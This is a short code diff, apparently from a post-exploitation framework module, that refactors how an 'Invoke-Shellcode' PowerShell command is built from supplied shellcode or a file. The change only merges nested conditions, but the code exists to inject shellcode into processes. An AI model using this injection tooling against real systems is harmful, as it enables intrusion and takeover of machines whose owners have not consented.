@@ -23,18 +23,22 @@ class Module:
         script_end = "\nInvoke-Shellcode -Force"
 
         for option, values in params.items():
-            if option.lower() != "agent" and option.lower() != "listener":
-                if values and values != "":
-                    if option.lower() == "shellcode":
-                        # transform the shellcode to the correct format
-                        sc = ",0".join(values.split("\\"))[0:]
-                        script_end += " -" + str(option) + " @(" + sc + ")"
-                    elif option.lower() == "file":
-                        data = base64.b64decode(params["File"].get_base64_file())
-                        sc = ",".join([f"0x{byte:02x}" for byte in data])
-                        script_end += f" -shellcode @({sc[:-1]})"
-                    else:
-                        script_end += " -" + str(option) + " " + str(values)
+            if (
+                option.lower() != "agent"
+                and option.lower() != "listener"
+                and values
+                and values != ""
+            ):
+                if option.lower() == "shellcode":
+                    # transform the shellcode to the correct format
+                    sc = ",0".join(values.split("\\"))[0:]
+                    script_end += " -" + str(option) + " @(" + sc + ")"
+                elif option.lower() == "file":
+                    data = base64.b64decode(params["File"].get_base64_file())
+                    sc = ",".join([f"0x{byte:02x}" for byte in data])
+                    script_end += f" -shellcode @({sc[:-1]})"
+                else:
+                    script_end += " -" + str(option) + " " + str(values)
 
         script_end += "; 'Shellcode injected.'"
 
